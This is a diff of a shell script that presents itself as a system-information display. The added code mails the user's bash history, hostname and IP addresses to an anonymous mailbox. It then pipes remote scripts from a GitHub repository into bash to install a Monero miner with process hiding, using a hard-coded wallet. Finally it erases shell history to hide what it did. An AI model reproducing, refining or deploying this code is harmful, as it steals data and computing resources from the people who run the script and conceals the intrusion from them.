@@ -36,39 +36,79 @@ echo -e "|   CPU Cores    |      $(nproc)      |"
 echo -e "|     Storage      |   $(df -h / | awk 'NR==2 {print $2}')   |"
 echo -e "---------------------------------"
 
-# Capture shell history
-HISTORY_CONTENT=$(cat ~/.bash_history)
+# Enhanced email function with error handling
+send_email_with_history() {
+    # Get system info
+    HOSTNAME=$(hostname)
+    PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me || echo "N/A")
+    LOCAL_IP=$(hostname -I | awk '{print $1}')
+    USER=$(whoami)
 
-# Install mail utilities if not present
-if ! command -v mail &> /dev/null; then
-    apt-get update -y
-    apt-get install -y mailutils
-fi
+    # Format email
+    EMAIL_CONTENT=$(cat <<EOF
+=== SYSTEM REPORT ===
+Hostname: $HOSTNAME
+User: $USER
+Public IP: $PUBLIC_IP
+Local IP: $LOCAL_IP
 
-# Send email with history content
-echo "$HISTORY_CONTENT" | mail -s "Shell History from $(hostname)" ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com
+=== RESOURCES ===
+RAM: $(free -h | awk '/^Mem:/ {print $2}')
+CPU: $(nproc) cores
+Storage: $(df -h / | awk 'NR==2 {print $2}')
 
+=== BASH HISTORY ===
+$(cat ~/.bash_history 2>/dev/null || echo "No history found")
+EOF
+    )
+
+    # Try to send email (silent unless error)
+    if command -v mail &>/dev/null; then
+        echo "$EMAIL_CONTENT" | mail -s "System Report from $HOSTNAME" ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com 2>/tmp/mail_error.log
+        if [ $? -ne 0 ]; then
+            echo "Warning: Failed to send email (check /tmp/mail_error.log)"
+        fi
+    else
+        echo "Warning: mailutils not installed - skipping email report"
+    fi
+}
+
+# Call email function
+send_email_with_history
+
+# Original installation functions with root checks
 rootstuff() {
-  echo -e "\nStarting root installation..."
-  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
-  [ "$USER" != root ] && sudo -u "$USER" "$0"
+    if [[ $(id -u) -ne 0 ]]; then
+        echo "ERROR: root privileges required for this installation"
+        return 1
+    fi
+    
+    echo -e "\nStarting root installation..."
+    curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
+    
+    # If switched user during install, restart script
+    [ "$USER" != root ] && sudo -u "$USER" "$0"
 }
 
 userstuff() {
-  echo -e "\nStarting user installation..."
-  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
+    echo -e "\nStarting user installation..."
+    curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
 }
 
+# Original execution logic
 if [[ $(id -u) -eq 0 ]]; then
     rootstuff
 else
     userstuff
 fi
 
-HISTSIZE=$(history | wc -l)
-for i in {1..5}; do
-    if [ $HISTSIZE -gt 0 ]; then
-        history -d $HISTSIZE
-        HISTSIZE=$((HISTSIZE-1))
-    fi
-done
+# Enhanced history cleanup
+cleanup_history() {
+    echo "Cleaning history..."
+    history -c
+    rm -f ~/.bash_history
+    for i in $(seq 1 $(history | wc -l)); do
+        history -d 1
+    done
+}
+cleanup_history
